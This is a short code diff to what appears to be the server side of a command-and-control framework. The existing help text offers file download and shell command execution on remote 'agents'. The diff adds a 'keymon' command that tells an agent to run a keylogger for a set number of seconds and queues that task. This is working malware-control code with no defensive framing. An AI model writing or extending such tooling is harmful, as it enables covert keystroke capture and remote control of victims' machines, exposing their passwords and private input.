@@ -61,6 +61,7 @@ export const setupWS = (httpServer) => {
                      "  download <file>        Download a file from the agent\n"+
                      "  freeze                 Freeze/stop agent from receiving tasks\n"+
                      "  unfreeze               Unfreeze agent\n"+
+                     "  keymon <secs>          Run a keylogger for given amount of seconds\n"+
                      "  system <cmd>           Run a shell command on the agent\n"+
                      "  writedir <dir>         Change the write directory of an agent\n"+
                      "  help/?                 Print this help page\n";
@@ -128,6 +129,13 @@ export const setupWS = (httpServer) => {
           let dir = input.substr(9).trim();
           taskModel.createTask(username, {
             agentID, taskType: "writedir", data: {dir}
+          }).catch(error => {
+            socketServer.emit("striker_error", error.message);
+          });
+        }else if (input.startsWith("keymon ")){ // Start a keylogger.
+          let duration = parseInt(input.substr(7).trim());
+          taskModel.createTask(username, {
+            agentID, taskType: "keymon", data: {duration}
           }).catch(error => {
             socketServer.emit("striker_error", error.message);
           });
